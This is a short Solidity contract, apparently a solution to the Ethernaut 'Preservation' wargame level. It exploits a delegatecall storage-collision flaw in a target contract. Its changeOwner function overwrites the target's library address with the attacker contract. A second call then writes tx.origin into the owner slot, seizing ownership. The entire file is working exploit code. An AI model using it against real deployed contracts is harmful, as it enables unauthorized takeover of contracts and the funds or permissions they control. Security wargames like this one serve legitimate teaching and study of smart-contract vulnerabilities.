// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IPreservation {
  function setFirstTime(uint _timeStamp) external;
}

// Simple library contract to set the time
interface ILibrary {
  function setTime(uint _time) external;
}

contract PreservationSolution is ILibrary {
  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  constructor() public {
  }

  function changeOwner(address _preservation) public {
      IPreservation(_preservation).setFirstTime(uint(address(this)));
      IPreservation(_preservation).setFirstTime(uint(0));
  }


  function setTime(uint) override public {
      owner = tx.origin;
  }

} 
